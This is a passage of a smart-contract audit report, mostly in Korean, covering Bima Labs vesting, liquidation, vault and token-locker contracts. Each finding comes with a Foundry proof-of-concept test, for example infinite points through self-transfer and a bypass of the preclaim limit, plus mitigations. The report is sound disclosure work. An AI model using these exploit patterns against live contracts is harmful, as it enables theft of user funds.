**Lead Auditors**

[Dacian](https://x.com/DevDacian)

**Assisting Auditors**

 

---

# Findings
## High Risk


### `AllocationVesting` contract can be exploited for infinite points via self-transfer

**Description:** `AllocationVesting` 컨트랙트는 팀원, 투자자, 인플루언서 및 기타 토큰 할당 자격이 있는 사람들에게 베스팅 일정(vesting schedules)에 따라 포인트를 제공합니다.

`AllocationVesting::transferPoints`는 사용자가 포인트를 전송할 수 있게 해주지만, 이 함수는 자가 전송(self-transfer)을 올바르게 [처리](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/AllocationVesting.sol#L129-L133)하지 못합니다. 즉, 사용자가 자신에게 포인트를 전송하여 무한한 포인트를 얻는 방식으로 이를 악용할 수 있습니다:
```solidity
// update storage - deduct points from `from` using memory cache
allocations[from].points = uint24(fromAllocation.points - points);

// we don't use fromAllocation as it's been modified with _claim()
allocations[from].claimed = allocations[from].claimed - claimedAdjustment;

// @audit doesn't correctly handle self-transfer since the memory
// cache of `toAllocation.points` will still contain the original
// value of `fromAllocation.points`, so this can be exploited by
// self-transfer to get infinite points
//
// update storage - add points to `to` using memory cache
allocations[to].points = toAllocation.points + uint24(points);
```

**Impact:** 할당 자격이 있는 사람은 누구나 자신에게 무한한 포인트를 부여할 수 있으며, 따라서 받아야 할 것보다 더 많은 토큰을 받을 수 있습니다.

**Proof of Concept:** 다음 PoC 컨트랙트를 `test/foundry/dao/AllocationInvestingTest.t.sol`에 추가하세요:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// test setup
import {TestSetup, IBabelVault, ITokenLocker} from "../TestSetup.sol";
import {AllocationVesting} from "./../../../contracts/dao/AllocationVesting.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AllocationVestingTest is TestSetup {
    AllocationVesting internal allocationVesting;

    uint256 internal constant totalAllocation = 100_000_000e18;
    uint256 internal constant maxTotalPreclaimPct = 10;

    function setUp() public virtual override {
        super.setUp();

        allocationVesting = new AllocationVesting(IERC20(address(babelToken)),
                                                  tokenLocker,
                                                  totalAllocation,
                                                  address(babelVault),
                                                  maxTotalPreclaimPct);
    }

    function test_InfinitePointsExploit() external {
        AllocationVesting.AllocationSplit[] memory allocationSplits
            = new AllocationVesting.AllocationSplit[](2);

        uint24 INIT_POINTS = 50000;

        // allocate to 2 users 50% 50%
        allocationSplits[0].recipient = users.user1;
        allocationSplits[0].points = INIT_POINTS;
        allocationSplits[0].numberOfWeeks = 4;

        allocationSplits[1].recipient = users.user2;
        allocationSplits[1].points = INIT_POINTS;
        allocationSplits[1].numberOfWeeks = 4;

        // setup allocations
        uint256 vestingStart = block.timestamp + 1 weeks;
        allocationVesting.setAllocations(allocationSplits, vestingStart);

        // warp to start time
        vm.warp(vestingStart + 1);

        // attacker transfers their total initial point balance to themselves
        vm.prank(users.user1);
        allocationVesting.transferPoints(users.user1, users.user1, INIT_POINTS);

        // attacker then has double the points
        (uint24 points, , , ) = allocationVesting.allocations(users.user1);
        assertEq(points, INIT_POINTS*2);

        // does it again transferring the new larger value
        vm.prank(users.user1);
        allocationVesting.transferPoints(users.user1, users.user1, points);

        // has double again (4x from the initial points)
        (points, , , ) = allocationVesting.allocations(users.user1);
        assertEq(points, INIT_POINTS*4);

        // can go on forever to get infinite points
    }
}
```

설정이 매우 기본적이므로 `AllocationVesting::_claim` 내부의 토큰 전송을 주석 처리하세요:
```solidity
        // @audit commented out for PoC
        //vestingToken.transferFrom(vault, msg.sender, claimable);
```

실행: `forge test --match-test test_InfinitePointsExploit`

**Recommended Mitigation:** `AllocationVesting::transferPoints`에서 자가 전송을 방지하세요:
```diff
+   error SelfTransfer();

    function transferPoints(address from, address to, uint256 points) external callerOrDelegated(from) {
+       if(from == to) revert SelfTransfer();
```

**Bima:**
커밋 [ce0f8ce](https://github.com/Bima-Labs/bima-v1-core/commit/ce0f8cea6b38b886376f9d543ae2bb9c3b600de9)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### The `fetchRewards` function in `CurveDepositToken` and `ConvexDepositToken` causes a loss of accrued rewards

**Description:** `CurveDepositToken` 및 `ConvexDepositToken`의 `fetchRewards` 함수는 `_fetchRewards`를 호출하기 전에 `_updateIntegrals`를 호출하지 [못합니다](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/staking/Curve/CurveDepositToken.sol#L218-L221).

이로 인해 `block.timestamp - lastUpdate` 기간 동안 누적된 보상을 잃게 됩니다. 왜냐하면:
* `_fetchRewards`는 `block.timestamp`를 사용하여 `lastUpdate`와 `periodFinish`를 [업데이트합니다](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/staking/Curve/CurveDepositToken.sol#L243-L244)
* 따라서 향후 `_updateIntegrals` 호출은 `block.timestamp - lastUpdate` 기간 동안 `rewardIntegral[i]`를 [증가시키지 않습니다](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/staking/Curve/CurveDepositToken.sol#L199-L209)

[deposit](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/staking/Curve/CurveDepositToken.sol#L94-L95) 및 [withdraw](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/staking/Curve/CurveDepositToken.sol#L111-L112)는 항상 `_fetchRewards`를 호출하기 바로 직전에 `_updateIntegrals`를 호출한다는 점에 유의하세요.

**Impact:** 누적된 보상의 손실.

**Recommended Mitigation:** `fetchRewards`는 `_fetchRewards`를 호출하기 전에 `_updateIntegrals`를 호출해야 합니다:
```diff
function fetchRewards() external {
    require(block.timestamp / 1 weeks >= periodFinish / 1 weeks, "Can only fetch once per week");
+   _updateIntegrals(address(0), 0, totalSupply);
    _fetchRewards();
}
```

`_updateIntegrals`도 이 경우 마지막 계정 관련 섹션을 실행하지 않도록 변경해야 합니다:
```diff
+ if (account != address(0)) {
    uint256 integralFor = rewardIntegralFor[account][i];
    if (integral > integralFor) {
        storedPendingReward[account][i] += uint128((balance * (integral - integralFor)) / 1e18);
        rewardIntegralFor[account][i] = integral;
    }
+ }
```

**Bima:**
커밋 [4156484](https://github.com/Bima-Labs/bima-v1-core/commit/415648420ab020b3ee4277a9b3957e84dc81b25a)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Impossible to liquidate borrower when a `TroveManager` instance only has 1 active borrower

**Description:** `TroveManager` 인스턴스에 활성 차용자(borrower)가 1명만 있는 경우, 해당 차용자를 청산하는 것이 불가능합니다. 그 이유는 `LiquidationManager::liquidateTroves`가 `troveCount > 1`일 때만 [while](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L166) 루프와 [if](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L192) 문 내의 코드를 실행하기 때문입니다:
```solidity
uint256 troveCount = troveManager.getTroveOwnersCount();
...
while (trovesRemaining > 0 && troveCount > 1) {
...
if (trovesRemaining > 0 && !troveManagerValues.sunsetting && troveCount > 1) {
```

`while` 루프와 `if` 문 내부의 코드가 실행되지 않기 때문에, `totals.totalDebtInSequence`가 값이 설정되지 않아 다음 [revert](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L230)가 발생합니다:
```solidity
require(totals.totalDebtInSequence > 0, "TroveManager: nothing to liquidate");
```

동일한 문제가 `LiquidationManager::batchLiquidateTroves`에도 적용되며, 이 함수도 유사한 [while](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L287) 루프와 [if](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L314) 문 조건을 가지고 있습니다:
```solidity
uint256 troveCount = troveManager.getTroveOwnersCount();
...
while (troveIter < length && troveCount > 1) {
...
if (troveIter < length && troveCount > 1) {
```

그리고 동일한 오류로 [revert](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L360)됩니다:
```solidity
require(totals.totalDebtInSequence > 0, "TroveManager: nothing to liquidate");
```

**Impact:** `TroveManager` 인스턴스에 활성 차용자가 1명만 있는 경우 해당 차용자를 청산할 수 없습니다. 다른 차용자들이 동일한 `TroveManager` 인스턴스에서 활성화되면 청산될 수 있지만, 이는 늦은 청산으로 이어져 프로토콜에 자금 손실을 초래할 수 있습니다.

또한 종료 중(sunsetting)인 `TroveManager`의 마지막 활성 차용자를 청산하는 것은 영구적으로 불가능합니다. 왜냐하면 그 경우에는 새로운 활성 차용자가 생성될 수 없기 때문입니다.

**Proof of Concept:** 다음 PoC 컨트랙트를 `test/foundry/core/LiquidationManagerTest.t.sol`에 추가하세요:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// test setup
import {BorrowerOperationsTest} from "./BorrowerOperationsTest.t.sol";

contract LiquidationManagerTest is BorrowerOperationsTest {

    function setUp() public virtual override {
        super.setUp();

        // verify staked btc trove manager enabled for liquidation
        assertTrue(liquidationMgr.isTroveManagerEnabled(stakedBTCTroveMgr));
    }

    function test_impossibleToLiquidateSingleBorrower() external {
        // depositing 2 BTC collateral (price = $60,000 in MockOracle)
        // use this test to experiment with different hard-coded values
        uint256 collateralAmount = 2e18;

        uint256 debtAmountMax
            = (collateralAmount * _getScaledOraclePrice() / borrowerOps.CCR())
              - INIT_GAS_COMPENSATION;

        _openTrove(users.user1, collateralAmount, debtAmountMax);

        // set new value of btc to $1 which should ensure liquidation
        mockOracle.setResponse(mockOracle.roundId() + 1,
                               int256(1 * 10 ** 8),
                               block.timestamp + 1,
                               block.timestamp + 1,
                               mockOracle.answeredInRound() + 1);
        // warp time to prevent cached price being used
        vm.warp(block.timestamp + 1);

        // then liquidate the user - but it fails since the
        // `while` and `for` loops get bypassed when there is
        // only 1 active borrower!
        vm.expectRevert("LiquidationManager: nothing to liquidate");
        liquidationMgr.liquidate(stakedBTCTroveMgr, users.user1);

        // attempting to use the other liquidation function has same problem
        uint256 mcr = stakedBTCTroveMgr.MCR();
        vm.expectRevert("LiquidationManager: nothing to liquidate");
        liquidationMgr.liquidateTroves(stakedBTCTroveMgr, 1, mcr);

        // the borrower is impossible to liquidate
    }
}
```

실행: `forge test --match-test test_impossibleToLiquidateSingleBorrower`.

**Recommended Mitigation:** 단순히 `troveCount >= 1`로 변경하면 `TroveManager::_redistributeDebtAndColl` 내부에서 0으로 나누기 패닉이 발생합니다. 가능한 해결책은 해당 함수에 다음을 추가하는 것입니다:
```diff
        uint256 totalStakesCached = totalStakes;

+       // if there is only 1 trove open and that is being liquidated, prevent
+       // a panic during liquidation due to divide by zero
+       if(totalStakesCached == 0) {
+           totalStakesCached = 1;
+       }

        // Get the per-unit-staked terms
```

이 변경으로 `troveCount >= 1`을 모든 곳에서 활성화하는 것이 안전해 보이지만, `LiquidationManager::liquidateTroves` 내부에는 [다른 트로브를 찾는](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L196-L205) 코드가 있어 트로브가 1개만 있을 때 실행하면 문제가 발생할 수 있습니다.

참고: 기존 코드에는 "마지막 트로브 청산"이 종료 중인 `TroveManager`를 닫을 수 있도록 차단된다는 [주석](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/TroveManager.sol#L1083-L1086)이 있습니다. 그러나 현재 구현은 언제든지 단일 트로브의 청산을 방지합니다.

제안된 수정 사항은 마지막 트로브가 청산될 경우 종료 중인 `TroveManager`가 닫히는 것을 방지할 수 있습니다. 왜냐하면 `defaultedDebt > 0`인 상태가 되어 `TroveManager::getEntireSystemDebt`가 0보다 큰 값을 반환하게 되고, 이는 이 [체크](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/BorrowerOperations.sol#L124)가 false를 반환하게 하기 때문입니다.

**Bima:**
우리는 각 `TroveManager`에 최소한의 부채와 가장 높은 CR을 가진 자체 트로브를 보유함으로써 이를 처리할 것입니다. 이렇게 하면 모두가 청산 가능하게 되고, 종료 중에도 우리의 트로브만 닫으면 되며 이것이 마지막 트로브가 될 것입니다.


### Permanent loss of `BabelToken` if a disabled emissions receiver doesn't call `Vault::allocateNewEmissions`

**Description:** 비활성화된 배출량 수신자(emissions receiver)가 `Vault::allocateNewEmissions`를 호출하지 않으면 `BabelToken`이 영구적으로 손실됩니다. 이유는 다음과 같습니다:
* `Vault::_allocateTotalWeekly`는 비활성화된 수신자에 대한 투표를 포함한 총 주간 투표에 따라 `BabelToken`을 할당합니다.
* 비활성화된 수신자가 `Vault::allocateNewEmissions`를 호출하지 않으면, 수신자에게 이미 할당된 토큰은 `BabelVault::unallocatedTotal`을 증가시키는 데 사용되지 않고 단순히 "손실"됩니다.
* `Vault::allocateNewEmissions`는 수신자만 호출할 수 있으며, 비활성화된 수신자는 이 함수를 호출할 인센티브가 없습니다.
* 토큰 손실은 비활성화된 수신자의 양에 따라 증가합니다.

**Impact:** 배출량 수신자를 비활성화한 후 `BabelToken`의 영구적인 손실.

**Proof of Concept:** test/foundry/dao/VaultTest.t.sol에 PoC 함수를 추가하세요:
```solidity
function test_allocateNewEmissions_tokensLostAfterDisablingReceiver() public {
    // setup vault giving user1 half supply to lock for voting power
    uint256 initialUnallocated = _vaultSetupAndLockTokens(INIT_BAB_TKN_TOTAL_SUPPLY/2);

    // receiver to be disabled later
    address receiver1 = address(mockEmissionReceiver);
    uint256 RECEIVER_ID1 = _vaultRegisterReceiver(receiver1, 1);

    // ongoing receiver
    MockEmissionReceiver mockEmissionReceiver2 = new MockEmissionReceiver();
    address receiver2 = address(mockEmissionReceiver2);
    uint256 RECEIVER_ID2 = _vaultRegisterReceiver(receiver2, 1);

    // user votes for receiver1 to get emissions with 50% of their points
    IIncentiveVoting.Vote[] memory votes = new IIncentiveVoting.Vote[](1);
    votes[0].id = RECEIVER_ID1;
    votes[0].points = incentiveVoting.MAX_POINTS() / 2;
    vm.prank(users.user1);
    incentiveVoting.registerAccountWeightAndVote(users.user1, 52, votes);

    // user votes for receiver2 to get emissions with 50% of their points
    votes[0].id = RECEIVER_ID2;
    vm.prank(users.user1);
    incentiveVoting.vote(users.user1, votes, false);

    // disable emission receiver 1 prior to calling allocateNewEmissions
    vm.prank(users.owner);
    babelVault.setReceiverIsActive(RECEIVER_ID1, false);

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // cache current system week
    uint16 systemWeek = SafeCast.toUint16(babelVault.getWeek());

    // initial unallocated supply has not changed
    assertEq(babelVault.unallocatedTotal(), initialUnallocated);

    // receiver calls allocateNewEmissions
    vm.prank(receiver2);
    uint256 allocatedToEachReceiver = babelVault.allocateNewEmissions(RECEIVER_ID2);

    // verify BabelVault::totalUpdateWeek is current system week
    assertEq(babelVault.totalUpdateWeek(), systemWeek);

    // verify receiver1 and receiver2 have the same allocated amounts
    uint256 firstWeekEmissions = initialUnallocated*INIT_ES_WEEKLY_PCT/BIMA_100_PCT;
    assertTrue(firstWeekEmissions > 0);
    assertEq(babelVault.unallocatedTotal(), initialUnallocated - firstWeekEmissions);
    assertEq(firstWeekEmissions, allocatedToEachReceiver * 2);

    // if receiver1 doesn't call allocateNewEmissions the tokens they would
    // have received would never be allocated. Only if receiver1 calls allocateNewEmissions
    // do the tokens move into BabelVault::unallocatedTotal
    //
    // verify unallocated is increasing if receiver1 calls allocateNewEmissions
    vm.prank(receiver1);
    babelVault.allocateNewEmissions(RECEIVER_ID1);
    assertEq(babelVault.unallocatedTotal(), initialUnallocated - firstWeekEmissions + allocatedToEachReceiver);

    // since receiver1 was disabled they have no incentive to call allocateNewEmissions
    // allocateNewEmissions only allows the receiver to call it so admin is
    // unable to rescue those tokens
}
```

실행: `forge test --match-test test_allocateNewEmissions_tokensLostAfterDisablingReceiver`

**Recommended Mitigation:** 누구나 비활성화된 수신자에 대해 `Vault::allocateNewEmissions`를 호출하여 할당된 자금을 회수할 수 있어야 합니다. 그리고 사용자가 비활성화된 수신자에게 투표하여 싫어하는 활성 수신자의 배출량을 "훔치는" 것을 방지하기 위해 비활성화된 수신자에 대한 투표는 허용되지 않아야 합니다.

**Bima:**
커밋 [42e2ed5](https://github.com/Bima-Labs/bima-v1-core/commit/42e2ed52feda653d56ee0282b93fdabdd7d68350) & [5a7f862](https://github.com/Bima-Labs/bima-v1-core/commit/5a7f862279db6f8834477997ae701b8bb57323ed)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.

\clearpage
## Medium Risk


### Loss of user locked voting tokens due to unsafe downcast overflow

**Description:** `TokenLocker::AccountData`는 계정의 현재 `locked`, `unlocked` 및 `frozen` 잔액을 `uint32`를 사용하여 [저장합니다](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L41-L49):
```solidity
struct AccountData {
    // Currently locked balance. Each week the lock weight decays by this amount.
    uint32 locked;
    // Currently unlocked balance (from expired locks, can be withdrawn)
    uint32 unlocked;
    // Currently "frozen" balance. A frozen balance is equivalent to a `MAX_LOCK_WEEKS` lock,
    // where the lock weight does not decay weekly. An account may have a locked balance or a
    // frozen balance, never both at the same time.
    uint32 frozen;
```

`TokenLocker::_lock` 내부에서 사용자가 잠그는 입력 `uint256 _amount` 토큰 값은 `uint32`로 안전하지 않게 [다운캐스트](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L450)됩니다:
```solidity
accountData.locked = uint32(accountData.locked + _amount);
```

그런 다음 `TokenLocker::_weeklyWeightWrite`에서 `unlocked` 금액을 업데이트하기 위한 계산에서 `accountData.locked`가 `uint256`으로 [읽혀지지만](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L914), 다운캐스트가 이미 발생했으므로 이는 소용이 없습니다:
```solidity
uint256 locked = accountData.locked;
```

마지막으로 `TokenLocker::withdrawExpiredLocks`에서 오버플로우로 인해 결과가 0이면 "No unlocked tokens"로 [revert](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L765-L780)되거나, 사용자가 처음에 잠근 것보다 훨씬 적은 토큰을 다시 전송합니다:
```solidity
function withdrawExpiredLocks(uint256 _weeks) external returns (bool) {
    _weeklyWeightWrite(msg.sender);
    getTotalWeightWrite();

    AccountData storage accountData = accountLockData[msg.sender];
    uint256 unlocked = accountData.unlocked;
    require(unlocked > 0, "No unlocked tokens");
    accountData.unlocked = 0;
    if (_weeks > 0) {
        _lock(msg.sender, unlocked, _weeks);
    } else {
        lockToken.transfer(msg.sender, unlocked * lockToTokenRatio);
        emit LocksWithdrawn(msg.sender, unlocked, 0);
    }
    return true;
}
```

**Impact:** 안전하지 않은 다운캐스트 오버플로우로 인한 사용자 잠금 투표 토큰의 손실.

**Proof of Concept:** 간단한 예를 들어, `test/foundry/TestSetup.sol`에서 `INIT_BAB_TKN_TOTAL_SUPPLY`를 `type(uint32).max`보다 큰 값으로 설정하고 `INIT_LOCK_TO_TOKEN_RATIO = 1`로 설정하세요. 예:
```solidity
uint256 internal constant INIT_LOCK_TO_TOKEN_RATIO = 1;
uint256 internal constant INIT_BAB_TKN_TOTAL_SUPPLY = 1_000_000e18;
```

다음 테스트 컨트랙트를 `test/foundry/dao/TokenLockerTest.t.sol`에 추가하세요:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// test setup
import {TestSetup, IBabelVault} from "../TestSetup.sol";

contract TokenLockerTest is TestSetup {

    function setUp() public virtual override {
        super.setUp();

        // setup the vault to get BabelTokens which are used for voting
        uint128[] memory _fixedInitialAmounts;
        IBabelVault.InitialAllowance[] memory initialAllowances
            = new IBabelVault.InitialAllowance[](1);

        // give user1 allowance over the entire supply of voting tokens
        initialAllowances[0].receiver = users.user1;
        initialAllowances[0].amount = INIT_BAB_TKN_TOTAL_SUPPLY;

        vm.prank(users.owner);
        babelVault.setInitialParameters(emissionSchedule,
                                        boostCalc,
                                        INIT_BAB_TKN_TOTAL_SUPPLY,
                                        INIT_VLT_LOCK_WEEKS,
                                        _fixedInitialAmounts,
                                        initialAllowances);

        // transfer voting tokens to recipients
        vm.prank(users.user1);
        babelToken.transferFrom(address(babelVault), users.user1, INIT_BAB_TKN_TOTAL_SUPPLY);

        // verify recipients have received voting tokens
        assertEq(babelToken.balanceOf(users.user1), INIT_BAB_TKN_TOTAL_SUPPLY);
    }

    function test_withdrawExpiredLocks_LossOfLockedTokens() external {
        // save user initial balance
        uint256 userInitialBalance = babelToken.balanceOf(users.user1);
        assertEq(userInitialBalance, INIT_BAB_TKN_TOTAL_SUPPLY);

        // assert overflow will occur
        assertTrue(userInitialBalance > uint256(type(uint32).max)+1);

        // first lock up entire user balance for 1 week
        vm.prank(users.user1);
        tokenLocker.lock(users.user1, userInitialBalance, 1);

        // advance time by 2 week
        vm.warp(block.timestamp + 2 weeks);
        uint256 weekNum = 2;
        assertEq(tokenLocker.getWeek(), weekNum);

        // withdraw without re-locking to get all locked tokens back
        vm.prank(users.user1);
        tokenLocker.withdrawExpiredLocks(0);

        // verify user received all their tokens back
        assertEq(babelToken.balanceOf(users.user1), userInitialBalance);

        // fails with 2701131776 != 1000000000000000000000000
        // user locked   1000000000000000000000000
        // user unlocked 2701131776
        // critical loss of funds
    }
}
```

실행: `forge test --match-test test_withdrawExpiredLocks_LossOfLockedTokens -vvv`

**Recommended Mitigation:** 투표 토큰의 총 공급량을 `<= type(uint32).max * lockToTokenRatio`로 제한하고 안전하지 않은 다운캐스트를 수행하는 대신 OpenZeppelin의 `SafeCast` [라이브러리](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeCast.sol)를 사용하세요.

공급 제한은 `BabelVault::setInitialParameters` 내에 다음과 같이 배치되어야 합니다:
```solidity
// enforce invariant described in TokenLocker to prevent overflows
require(totalSupply <= type(uint32).max * locker.lockToTokenRatio(),
        "Total supply must be <= type(uint32).max * lockToTokenRatio");
```

사실 이는 이 [주석](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L24-L30)에 언급되어 있지만 어디에서도 강제되지 않습니다.

**Bima:**
커밋 [9b69cbc](https://github.com/Bima-Labs/bima-v1-core/commit/9b69cbccde9a7a04e4565010b70d0fc5ba0849be#diff-cb0cf104b2cecec4497370ac4e4c839cecf6fc744430a058acc8465914b9e5ebR103-R106) 및 [7a52f26](https://github.com/Bima-Labs/bima-v1-core/commit/7a52f266420ea4cd4c6b4c87b5f600bfc7dc54ad)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Maximum preclaim limit can be easily bypassed to preclaim entire token allocation

**Description:** `AllocationVesting` 컨트랙트는 토큰 수령자가 총 토큰 할당량의 최대치까지 미리 청구(preclaim)할 수 있도록 허용하지만, 이 제한은 쉽게 우회될 수 있어 수령자가 전체 할당량을 미리 청구할 수 있게 합니다.

**Impact:** 토큰 할당 수령자는 전체 할당량을 미리 청구할 수 있습니다. 사전 청구는 `TokenLocker`를 통해 최대 기간 잠금을 수행하므로, DAO에서 가능한 것보다 훨씬 더 큰 투표권을 빠르게 얻기 위해 악용될 수 있습니다.

**Proof of Concept:** PoC 함수를 `test/foundry/dao/AllocationInvestingTest.t.sol`에 추가하세요:
```solidity
function test_transferPoints_BypassVestingViaPreclaim() external {
    AllocationVesting.AllocationSplit[] memory allocationSplits
        = new AllocationVesting.AllocationSplit[](2);

    uint24 INIT_POINTS = 50000;

    // allocate to 2 users 50% 50%
    allocationSplits[0].recipient = users.user1;
    allocationSplits[0].points = INIT_POINTS;
    allocationSplits[0].numberOfWeeks = 4;

    allocationSplits[1].recipient = users.user2;
    allocationSplits[1].points = INIT_POINTS;
    allocationSplits[1].numberOfWeeks = 4;

    // setup allocations
    uint256 vestingStart = block.timestamp + 1 weeks;
    allocationVesting.setAllocations(allocationSplits, vestingStart);

    // warp to start time
    vm.warp(vestingStart + 1);

    // each entity receiving allocations is entitled to 10% preclaim
    // which they can use to get voting power by locking it up in TokenLocker
    uint256 MAX_PRECLAIM = (maxTotalPreclaimPct * totalAllocation) / (2 * 100);

    // user1 does this once, passing 0 to preclaim max possible
    vm.prank(users.user1);
    allocationVesting.lockFutureClaimsWithReceiver(users.user1, users.user1, 0);

    // user1 has now preclaimed the max allowed
    (, , , uint96 preclaimed) = allocationVesting.allocations(users.user1);
    assertEq(preclaimed, MAX_PRECLAIM);

    // user1 attempts it again
    vm.prank(users.user1);
    allocationVesting.lockFutureClaimsWithReceiver(users.user1, users.user1, 0);

    // but nothing additional is preclaimed
    (, , , preclaimed) = allocationVesting.allocations(users.user1);
    assertEq(preclaimed, MAX_PRECLAIM);

    // user 1 needs to wait 3 days to bypass LockedAllocation revert
    vm.warp(block.timestamp + 3 days);

    // user1 calls `transferPoints` to move their points to a new address
    address user1Second = address(0x1337);
    vm.prank(users.user1);
    allocationVesting.transferPoints(users.user1, user1Second, INIT_POINTS);

    // since `transferPoints` doesn't transfer preclaimed amounts, the
    // new address has its preclaimed amount as 0
    (, , , preclaimed) = allocationVesting.allocations(user1Second);
    assertEq(preclaimed, 0);

    // user1 now uses their secondary address to preclaim a second time!
    vm.prank(user1Second);
    allocationVesting.lockFutureClaimsWithReceiver(user1Second, user1Second, 0);

    // user1 was able to claim 2x the max preclaim
    (, , , preclaimed) = allocationVesting.allocations(user1Second);
    assertEq(preclaimed, MAX_PRECLAIM);

    // user1 can continue this strategy to preclaim their entire
    // token allocation which would give them significantly greater
    // voting power in the DAO, since each preclaim performs a max
    // length lock via TokenLocker to give voting weight
}
```

설정이 매우 기본적이므로 `AllocationVesting::_claim` 및 `lockFutureClaimsWithReceiver` 내부의 토큰 전송을 주석 처리하세요.

실행: `forge test --match-test test_transferPoints_BypassVestingViaPreclaim`

**Recommended Mitigation:** `AllocationVesting::transferPoints`에서 모든 다른 스토리지 업데이트 *전에* 다음 스토리지 업데이트를 수행하세요:
```solidity
// update storage - if from has a positive preclaimed balance,
// transfer preclaimed amount in proportion to points tranferred
// to prevent point transfers being used to bypass the maximum preclaim limit
if(fromAllocation.preclaimed > 0) {
    uint96 preclaimedToTransfer = SafeCast.toUint96((uint256(fromAllocation.preclaimed) * points) /
                                                    fromAllocation.points);

    // this should never happen but sneaky users may try preclaiming and
    // point transferring using very small amounts so prevent this
    if(preclaimedToTransfer == 0) revert PositivePreclaimButZeroTransfer();

    allocations[to].preclaimed = toAllocation.preclaimed + preclaimedToTransfer;
    allocations[from].preclaimed = fromAllocation.preclaimed - preclaimedToTransfer;
}
```

**Bima:**
커밋 [8bcbf1b](https://github.com/Bima-Labs/bima-v1-core/commit/8bcbf1b7133eb61d07a6aa1e038e8b43d06d188a), [239fe50](https://github.com/Bima-Labs/bima-v1-core/commit/239fe5064232cd19d0607d3ffc07773b43598689) & [0bfbd9a](https://github.com/Bima-Labs/bima-v1-core/commit/0bfbd9aac20f73ddb7fa990ff852d867884cd7f4)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### When `BabelVault` uses an `EmissionSchedule` but receivers have no voting weight, the vault's unallocated supply will decrease even though no tokens are being allocated

**Description:** `BabelVault`가 `EmissionSchedule`을 사용하지만 수신자가 투표 가중치를 가지지 않는 경우, 토큰이 실제로 할당되지 않음에도 불구하고 볼트의 미할당 공급량이 감소합니다.

**Impact:** 볼트의 미할당 공급량이 감소하지만 실제로는 토큰이 수신자에게 할당되지 않기 때문에 토큰이 사실상 손실됩니다.

**Proof of Concept:** 다음 PoC를 `test/foundry/dao/VaultTest.t.sol`에 추가하세요:
```solidity
function test_allocateNewEmissions_unallocatedTokensDecreasedButZeroAllocated() external {
    // first need to fund vault with tokens
    test_setInitialParameters();

    // owner registers receiver
    address receiver = address(mockEmissionReceiver);
    vm.prank(users.owner);
    assertTrue(babelVault.registerReceiver(receiver, 1));

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // cache state prior to allocateNewEmissions
    uint256 RECEIVER_ID = 1;
    uint16 systemWeek = SafeCast.toUint16(babelVault.getWeek());

    // entire supply still not allocated
    uint256 initialUnallocated = babelVault.unallocatedTotal();
    assertEq(initialUnallocated, INIT_BAB_TKN_TOTAL_SUPPLY);

    // receiver calls allocateNewEmissions
    vm.prank(receiver);
    uint256 allocated = babelVault.allocateNewEmissions(RECEIVER_ID);

    // verify BabelVault::totalUpdateWeek current system week
    assertEq(babelVault.totalUpdateWeek(), systemWeek);

    // verify unallocated supply reduced by weekly emission percent
    uint256 firstWeekEmissions = INIT_BAB_TKN_TOTAL_SUPPLY*INIT_ES_WEEKLY_PCT/MAX_PCT;
    assertTrue(firstWeekEmissions > 0);
    assertEq(babelVault.unallocatedTotal(), initialUnallocated - firstWeekEmissions);

    // verify emissions correctly set for current week
    assertEq(babelVault.weeklyEmissions(systemWeek), firstWeekEmissions);

    // verify BabelVault::lockWeeks reduced correctly
    assertEq(babelVault.lockWeeks(), INIT_ES_LOCK_WEEKS-INIT_ES_LOCK_DECAY_WEEKS);

